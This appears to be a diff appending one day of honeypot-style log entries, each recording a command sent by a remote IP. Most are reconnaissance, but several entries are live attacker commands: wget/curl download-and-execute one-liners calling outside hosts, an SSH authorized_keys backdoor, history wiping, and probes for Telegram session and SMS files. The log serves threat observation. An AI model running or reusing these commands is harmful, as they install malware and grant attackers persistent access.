@@ -14966,3 +14966,342 @@
 2025-04-10 22:44:52 from 167.71.77.3: uname -s -v -n -r -m
 2025-04-10 22:58:39 from 157.230.125.68: uname -a
 2025-04-10 23:27:10 from 159.223.10.160: uname -s -v -n -r -m
+2025-04-11 00:00:20 from 183.66.17.82: uname -a
+2025-04-11 00:04:29 from 45.6.188.43: uname -s -v -n -r -m
+2025-04-11 00:08:10 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 00:08:11 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 00:08:12 from 45.135.193.100: /bin/sh
+2025-04-11 00:36:30 from 87.121.84.211: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 00:36:31 from 87.121.84.211: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 00:36:32 from 87.121.84.211: /bin/sh
+2025-04-11 01:02:54 from 137.184.86.214: uname -s -v -n -r -m
+2025-04-11 01:03:40 from 45.6.188.43: uname -s -v -n -r -m
+2025-04-11 01:16:01 from 20.39.195.9: (uname -smr || /bin/uname -smr || /usr/bin/uname -smr)
+2025-04-11 01:16:01 from 20.39.195.9: uname -smr || /bin/uname -smr || /usr/bin/uname -smr
+2025-04-11 01:23:25 from 167.99.210.141: uname -s -v -n -r -m
+2025-04-11 02:45:53 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 02:45:54 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 02:45:55 from 45.135.193.100: /bin/sh
+2025-04-11 04:12:15 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 04:12:16 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 04:12:17 from 45.135.193.100: /bin/sh
+2025-04-11 05:00:04 from 45.6.188.43: uname -s -v -n -r -m
+2025-04-11 05:29:59 from 45.6.188.43: uname -s -v -n -r -m
+2025-04-11 05:33:34 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 05:33:35 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 05:33:36 from 45.135.193.100: /bin/sh
+2025-04-11 06:05:27 from 222.118.167.160: /ip cloud print
+2025-04-11 06:05:28 from 222.118.167.160: ifconfig
+2025-04-11 06:05:28 from 222.118.167.160: uname -a
+2025-04-11 06:05:29 from 222.118.167.160: cat /proc/cpuinfo
+2025-04-11 06:05:29 from 222.118.167.160: ps | grep '[Mm]iner'
+2025-04-11 06:05:30 from 222.118.167.160: ps -ef | grep '[Mm]iner'
+2025-04-11 06:05:30 from 222.118.167.160: ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2025-04-11 06:05:31 from 222.118.167.160: echo Hi | cat -n
+2025-04-11 06:24:01 from 139.196.236.1: grep -c ^processor /proc/cpuinfo
+2025-04-11 06:26:03 from 139.196.236.1: grep -c ^processor /proc/cpuinfo
+2025-04-11 06:28:16 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:28:17 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:28:27 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:28:32 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:28:50 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:28:51 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:28:58 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:29:03 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:29:12 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:29:19 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:29:25 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:29:31 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:29:34 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:29:40 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:29:49 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:29:50 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:29:55 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:30:03 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:30:05 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:30:13 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:30:15 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:30:28 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:30:37 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:30:51 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:30:52 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:30:53 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:30:55 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:30:58 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:31:04 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:31:04 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:31:11 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:31:15 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:31:16 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:31:17 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:31:19 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:31:21 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:31:26 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:31:27 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:31:31 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:31:36 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:31:40 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:31:41 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:31:43 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:31:53 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:32:14 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:32:29 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:32:41 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:32:49 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:32:50 from 64.227.139.1: uname -s -v -n -r -m
+2025-04-11 06:32:58 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:33:01 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:33:08 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:33:12 from 83.229.124.127: uname -s -v -n -r -m
+2025-04-11 06:57:47 from 74.82.195.39: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-04-11 06:57:48 from 74.82.195.39: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-04-11 07:34:01 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:34:02 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:34:12 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:34:18 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:34:57 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:35:04 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:35:10 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:36:21 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:36:37 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:36:44 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:36:46 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:36:50 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:36:58 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:37:06 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:37:06 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:37:42 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:38:18 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:38:30 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:38:43 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:38:53 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:38:53 from 47.236.240.196: uname -s -v -n -r -m
+2025-04-11 07:40:33 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 07:42:57 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 07:43:14 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 07:47:32 from 74.82.195.39: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-04-11 07:47:32 from 74.82.195.39: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-04-11 07:48:10 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 07:48:25 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 07:48:45 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 07:51:57 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 07:52:16 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 08:29:06 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 08:29:24 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 08:29:39 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 08:34:13 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 08:36:29 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 09:02:12 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 09:02:28 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 09:17:17 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 09:17:33 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 09:27:51 from 95.182.115.124: uname -s -v -n -r -m
+2025-04-11 09:40:56 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 09:40:57 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 09:40:58 from 45.135.193.100: /bin/sh
+2025-04-11 09:47:53 from 171.213.216.176: /ip cloud print
+2025-04-11 09:47:54 from 171.213.216.176: ifconfig
+2025-04-11 09:47:55 from 171.213.216.176: uname -a
+2025-04-11 09:47:56 from 171.213.216.176: cat /proc/cpuinfo
+2025-04-11 09:47:57 from 171.213.216.176: ps | grep '[Mm]iner'
+2025-04-11 09:47:57 from 171.213.216.176: ps -ef | grep '[Mm]iner'
+2025-04-11 09:47:58 from 171.213.216.176: ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2025-04-11 09:47:59 from 171.213.216.176: locate D877F783D5D3EF8Cs
+2025-04-11 09:48:00 from 171.213.216.176: echo Hi | cat -n
+2025-04-11 10:37:27 from 182.215.66.232: /ip cloud print
+2025-04-11 10:37:27 from 182.215.66.232: ifconfig
+2025-04-11 10:37:28 from 182.215.66.232: uname -a
+2025-04-11 10:37:28 from 182.215.66.232: cat /proc/cpuinfo
+2025-04-11 10:37:28 from 182.215.66.232: ps | grep '[Mm]iner'
+2025-04-11 10:37:29 from 182.215.66.232: ps -ef | grep '[Mm]iner'
+2025-04-11 10:37:29 from 182.215.66.232: ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2025-04-11 10:37:30 from 182.215.66.232: echo Hi | cat -n
+2025-04-11 11:28:32 from 37.230.48.61: uname -a
+2025-04-11 11:33:36 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:33:44 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:34:00 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:34:09 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:35:35 from 183.66.17.82: uname -a
+2025-04-11 11:35:50 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:36:08 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:36:18 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:36:21 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:36:42 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:37:02 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:37:19 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:37:30 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:37:49 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:38:15 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:38:35 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:38:47 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:38:54 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:39:07 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:39:07 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:39:20 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:39:52 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:39:59 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:40:16 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:40:31 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 11:40:32 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 11:40:33 from 45.135.193.100: /bin/sh
+2025-04-11 11:40:46 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:40:48 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:41:15 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:41:55 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:42:20 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:42:43 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:42:51 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 11:42:53 from 143.198.208.180: uname -s -v -n -r -m
+2025-04-11 12:36:45 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 12:36:46 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 12:36:47 from 45.135.193.100: /bin/sh
+2025-04-11 14:29:25 from 123.247.100.63: uname -s -m
+2025-04-11 14:30:36 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 14:30:37 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 194.0.234.223/ssh; curl -O 194.0.234.223/ssh; chmod 777 ssh; sh ssh; rm -rf ssh; rm -rf ssh.1
+2025-04-11 14:30:38 from 45.135.193.100: /bin/sh
+2025-04-11 14:46:01 from 195.19.4.232: uname -a
+2025-04-11 17:24:40 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 17:27:18 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 17:32:01 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 17:33:49 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 17:39:33 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 17:40:10 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 17:40:22 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 17:40:54 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:40:55 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:41:08 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:41:17 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:41:23 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 17:42:13 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:42:23 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:42:33 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:42:41 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:43:08 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:43:16 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:43:31 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:43:37 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:43:57 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:44:32 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:44:55 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:45:15 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 17:45:27 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 17:45:28 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:45:31 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:45:39 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:45:45 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:45:59 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:46:17 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:46:31 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:46:52 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:47:28 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:47:30 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:47:41 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 17:48:04 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:49:02 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:49:37 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:50:06 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:50:32 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:50:35 from 34.171.85.136: uname -s -v -n -r -m
+2025-04-11 17:54:34 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 17:57:44 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:02:49 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:08:07 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:08:20 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:10:21 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:12:47 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:12:59 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:18:16 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:23:06 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:24:07 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:25:32 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:25:57 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:31:28 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:32:17 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:33:33 from 218.92.0.131: #!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c
+2025-04-11 18:33:54 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:34:18 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:34:30 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:35:36 from 218.92.0.131: /bin/eyshcjdmzg
+2025-04-11 18:35:36 from 218.92.0.131: ls -la /var/run/gcc.pid
+2025-04-11 18:39:56 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:40:23 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:42:24 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:42:36 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:44:38 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:48:56 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:50:57 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:53:10 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:54:11 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:54:25 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:54:37 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:57:28 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:58:21 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:59:35 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:59:47 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 18:59:59 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:00:23 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:01:00 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:07:04 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:08:41 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:15:02 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:17:21 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:23:54 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:24:33 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:25:21 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:26:57 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:31:18 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:39:05 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:40:16 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:40:40 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:42:02 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:42:26 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:43:14 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:43:26 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:45:01 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:47:26 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:48:49 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:52:22 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 19:58:15 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:00:49 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:01:12 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:01:59 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:02:35 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:04:34 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:06:45 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:08:21 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:11:19 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:12:07 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:12:18 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:12:42 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:14:04 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:15:04 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:15:39 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:15:51 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:24:48 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:29:36 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:30:11 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:31:40 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:33:20 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:33:45 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:37:38 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:44:09 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:44:40 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:46:02 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:46:38 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:50:49 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:51:11 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:52:58 from 134.209.155.208: uname -s -v -n -r -m
+2025-04-11 20:54:43 from 134.209.155.208: uname -s -v -n -r -m
